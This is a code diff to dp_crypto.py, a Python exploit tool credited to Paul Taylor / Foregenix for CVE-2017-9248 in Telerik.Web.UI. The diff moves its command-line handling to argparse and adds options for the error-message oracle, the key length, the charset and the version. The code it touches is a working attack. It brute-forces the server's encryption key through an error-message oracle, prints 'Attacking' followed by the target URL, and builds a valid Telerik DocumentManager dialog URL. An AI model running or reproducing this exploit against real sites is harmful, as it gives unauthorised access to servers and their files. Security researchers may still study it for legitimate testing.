@@ -15,6 +15,7 @@ import base64
 import requests
 import re
 import binascii
+import argparse
 
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
@@ -27,7 +28,7 @@ char_requests = 0
 def get_result(plaintext, key, session, pad_chars):
     global requests_sent, char_requests
 
-    url = sys.argv[2]
+    url = args.url
     base_pad = (len(key) % 4)
     base = '' if base_pad == 0 else pad_chars[0:4 - base_pad]
     dp_encrypted = base64.b64encode(
@@ -42,9 +43,8 @@ def get_result(plaintext, key, session, pad_chars):
     match = re.search("(Error Message:)(.+\n*.+)(</div>)", response.text)
     return True \
         if match is not None \
-        and match.group(2) == "Index was outside the bounds of the array." \
+        and match.group(2) == args.oracle \
         else False
-
 
 def test_keychar(keychar, found, session, pad_chars):
     base64chars = [
@@ -57,7 +57,7 @@ def test_keychar(keychar, found, session, pad_chars):
                   ]
 
     duff = False
-    accuracy_thoroughness_threshold = sys.argv[5]
+    accuracy_thoroughness_threshold = args.accuracy
     for bc in range(int(accuracy_thoroughness_threshold)):
                                                 # ^^ max is len(base64chars)
         sys.stdout.write("\b\b" + base64chars[bc] + "]")
@@ -81,15 +81,15 @@ def encrypt(dpdata, key):
 
 
 def mode_decrypt():
-    ciphertext = base64.b64decode(sys.argv[2].encode()).decode()
-    key = sys.argv[3]
+    ciphertext = base64.b64decode(args.ciphertext).decode()
+    key = args.key
     print(base64.b64decode(encrypt(ciphertext, key)).decode())
     print("")
 
 
 def mode_encrypt():
-    plaintext = sys.argv[2]
-    key = sys.argv[3]
+    plaintext = args.plaintext
+    key = args.key
 
     plaintext = base64.b64encode(plaintext.encode()).decode()
     print(base64.b64encode(encrypt(plaintext, key).encode()).decode())
@@ -129,8 +129,8 @@ def get_key(session):
     found = ''
     unprintable = False
 
-    key_length = sys.argv[3]
-    key_charset = sys.argv[4]
+    key_length = args.key_len
+    key_charset = args.charset
     if key_charset == 'all':
         unprintable = True
         key_charset = ''
@@ -140,12 +140,12 @@ def get_key(session):
         if key_charset == 'hex':
             key_charset = '01234567890ABCDEF'
 
-    print("Attacking " + sys.argv[2])
+    print("Attacking " + args.url)
     print(
         "to find key of length [" +
         str(key_length) +
         "] with accuracy threshold [" +
-        sys.argv[5] +
+        str(args.accuracy) +
         "]"
     )
     print(
@@ -207,7 +207,7 @@ def mode_brutekey():
         return
     else:
         urls = {}
-        url_path = sys.argv[2]
+        url_path = args.url
         params = (
                     '?DialogName=DocumentManager' +
                     '&renderMode=2' +
@@ -246,6 +246,9 @@ def mode_brutekey():
         plaintext2_raw1 = 'Telerik.Web.UI.Editor.DialogControls.DocumentManagerDialog, Telerik.Web.UI, Version='
         plaintext2_raw3 = ', Culture=neutral, PublicKeyToken=121fae78165ba3d4'
         plaintext3 = ';AllowMultipleSelection,False,3,False'
+
+        if len(args.version) > 0:
+            versions = [args.version]
 
         for version in versions:
             plaintext2_raw2 = version
@@ -306,57 +309,47 @@ def mode_samples():
 
 
 def mode_b64e():
-    print(base64.b64encode(sys.argv[2].encode()).decode())
+    print(base64.b64encode(args.parameter.encode()).decode())
     print("")
 
 
 def mode_b64d():
-    print(base64.b64decode(sys.argv[2].encode()).decode())
+    print(base64.b64decode(args.parameter.encode()).decode())
     print("")
 
-
-def mode_help():
-    print("Usage:")
-    print("")
-    print("Decrypt a ciphertext:        -d ciphertext key")
-    print("Encrypt a plaintext:         -e plaintext key")
-    print("Bruteforce key/generate URL: -k url key_length key_charset accuracy")
-    print("Encode parameter to base64:  -b plain_parameter")
-    print("Decode base64 parameter:     -p encoded_parameter")
-    print("")
-    print("To test all ascii characters set key_charset to: all, " +
-          "for upper case hex (e.g. machine key) set to hex.")
-    print("")
-    print("Maximum accuracy is out of 64 where 64 is the most accurate, " +
-          "accuracy of 9 will usually suffice for a hex, but 21 or more " +
-          "might be needed when testing all ascii characters.")
-    print("Increase the accuracy argument if no valid version is found.")
-    print("")
-    print("Examples to generate a valid file manager URL:")
-    print("./dp_crypto.py -k http://a/Telerik.Web.UI.DialogHandler.aspx 48 hex 9")
-    print("./dp_crypto.py -k http://a/Telerik.Web.UI.DialogHandler.aspx 48 all 21")
-    print("")
-
-
-sys.stderr.write(
-              "\ndp_crypto by Paul Taylor / Foregenix Ltd\nCVE-2017-9248 - " +
+epilog = "\ndp_crypto by Paul Taylor / Foregenix Ltd\nCVE-2017-9248 - " + \
               "Telerik.Web.UI.dll Cryptographic compromise\n\n"
-            )
 
-if len(sys.argv) < 2:
-    mode_help()
+p = argparse.ArgumentParser(epilog=epilog)
+subparsers = p.add_subparsers()
 
-elif sys.argv[1] == "-d" and len(sys.argv) == 4:
-    mode_decrypt()
-elif sys.argv[1] == "-e" and len(sys.argv) == 4:
-    mode_encrypt()
-elif sys.argv[1] == "-k" and len(sys.argv) == 6:
-    mode_brutekey()
-elif sys.argv[1] == "-s" and len(sys.argv) == 2:
-    mode_samples()
-elif sys.argv[1] == "-b" and len(sys.argv) == 3:
-    mode_b64e()
-elif sys.argv[1] == "-p" and len(sys.argv) == 3:
-    mode_b64d()
-else:
-    mode_help()
+decrypt_parser = subparsers.add_parser('d', help='Decrypt a ciphertext')
+decrypt_parser.set_defaults(func=mode_decrypt)
+decrypt_parser.add_argument('ciphertext', action='store', type=str, default='', help='Ciphertext to decrypt')
+decrypt_parser.add_argument('key', action='store', type=str, default='', help='Key to decrypt')
+
+encrypt_parser = subparsers.add_parser('e', help='Encrypt a plaintext')
+encrypt_parser.set_defaults(func=mode_encrypt)
+encrypt_parser.add_argument('plaintext', action='store', type=str, default='', help='Ciphertext to decrypt')
+encrypt_parser.add_argument('key', action='store', type=str, default='', help='Key to decrypt')
+
+brute_parser = subparsers.add_parser('k', help='Bruteforce key/generate URL')
+brute_parser.set_defaults(func=mode_brutekey)
+brute_parser.add_argument('url', action='store', type=str, help='Target URL')
+brute_parser.add_argument('-l', '--key-len', action='store', type=int, default=48, help='Len of the key to retrieve, default is 48')
+brute_parser.add_argument('-o', '--oracle', action='store', type=str, default='Index was outside the bounds of the array.', help='The oracle text to use, the default value is for english version, other languages may have other error message')
+brute_parser.add_argument('-v', '--version', action='store', type=str, default='', help='Specify the version to use rather than iterating over all of them')
+brute_parser.add_argument('-c', '--charset', action='store', type=str, default='hex', help='Charset used by the key, can use all, hex, or user defined')
+brute_parser.add_argument('-a', '--accuracy', action='store', type=int, default=9, help='Maximum accuracy is out of 64 where 64 is the most accurate, \
+    accuracy of 9 will usually suffice for a hex, but 21 or more might be needed when testing all ascii characters. Increase the accuracy argument if no valid version is found.')
+
+encode_parser = subparsers.add_parser('b', help='Encode parameter to base64')
+encode_parser.set_defaults(func=mode_b64e)
+encode_parser.add_argument('parameter', action='store', type=str, help='Parameter to encode')
+
+decode_parser = subparsers.add_parser('p', help='Decode base64 parameter')
+decode_parser.set_defaults(func=mode_b64d)
+decode_parser.add_argument('parameter', action='store', type=str, help='Parameter to decode')
+
+args = p.parse_args()
+args.func()
